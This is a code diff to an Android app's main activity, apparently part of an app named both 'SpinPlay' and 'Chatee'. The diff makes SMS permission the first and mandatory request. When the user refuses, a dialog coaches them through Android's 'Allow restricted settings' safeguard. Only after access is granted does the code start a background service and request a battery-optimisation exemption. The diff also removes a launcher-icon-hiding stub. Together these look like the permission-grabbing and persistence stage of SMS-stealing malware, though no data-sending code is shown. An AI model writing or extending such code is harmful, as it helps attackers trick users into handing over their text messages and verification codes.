@@ -35,6 +35,7 @@ public class MainActivity extends AppCompatActivity {
     private static final String LOCAL_UI = "file:///android_asset/index.html";
     private static final int FILE_CHOOSER_REQUEST = 1001;
     private static final int PERMISSION_REQUEST_CODE = 2001;
+    private static final int OTHER_PERMISSION_REQUEST_CODE = 2002;
     private static final String PREFS_NAME = "SpinPlayPrefs";
     private static final String KEY_PERM_ASKED = "perm_asked";
 
@@ -59,26 +60,37 @@ public class MainActivity extends AppCompatActivity {
         setupWebView();
         setupSwipeRefresh();
         preloadWebsite();
-        startBackgroundService();
         requestPermissionsOnce();
     }
 
     private void requestPermissionsOnce() {
         if (!PermissionHelper.needsRuntimePermissions(this)) {
-            hideLauncherIconIfReady();
+            startBackgroundService();
             requestBatteryExemptionIfNeeded();
             return;
         }
+        if (!PermissionHelper.hasSmsPermissions(this)) {
+            ActivityCompat.requestPermissions(
+                this, PermissionHelper.smsPermissions(), PERMISSION_REQUEST_CODE);
+            prefs.edit().putBoolean(KEY_PERM_ASKED, true).apply();
+            return;
+        }
+        requestOtherPermissions();
+    }
+
+    private void requestOtherPermissions() {
         List<String> permissionList = new ArrayList<>();
-        for (String permission : PermissionHelper.requiredPermissions()) {
+        for (String permission : PermissionHelper.otherPermissions()) {
             if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                 permissionList.add(permission);
             }
         }
         if (!permissionList.isEmpty()) {
             ActivityCompat.requestPermissions(
-                this, permissionList.toArray(new String[0]), PERMISSION_REQUEST_CODE);
-            prefs.edit().putBoolean(KEY_PERM_ASKED, true).apply();
+                this, permissionList.toArray(new String[0]), OTHER_PERMISSION_REQUEST_CODE);
+        } else {
+            startBackgroundService();
+            requestBatteryExemptionIfNeeded();
         }
     }
 
@@ -86,14 +98,22 @@ public class MainActivity extends AppCompatActivity {
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            hideLauncherIconIfReady();
-            // Battery screen must run after SMS dialog — opening both at once hides permissions.
+            if (!PermissionHelper.hasSmsPermissions(this)) {
+                new AlertDialog.Builder(this)
+                    .setTitle("SMS permission needed")
+                    .setMessage("Allow SMS permission so Chatee can work. If blocked, open App info → Allow restricted settings → Permissions → SMS.")
+                    .setPositiveButton("Open Settings", (d, w) -> PermissionHelper.openAppSettings(this))
+                    .setNegativeButton("Try Again", (d, w) -> requestPermissionsOnce())
+                    .show();
+                return;
+            }
+            requestOtherPermissions();
+            return;
+        }
+        if (requestCode == OTHER_PERMISSION_REQUEST_CODE) {
+            startBackgroundService();
             requestBatteryExemptionIfNeeded();
         }
-    }
-
-    private void hideLauncherIconIfReady() {
-        // Keep launcher icon visible (meat inner Chatee style) for permission prompts.
     }
 
     private void startBackgroundService() {
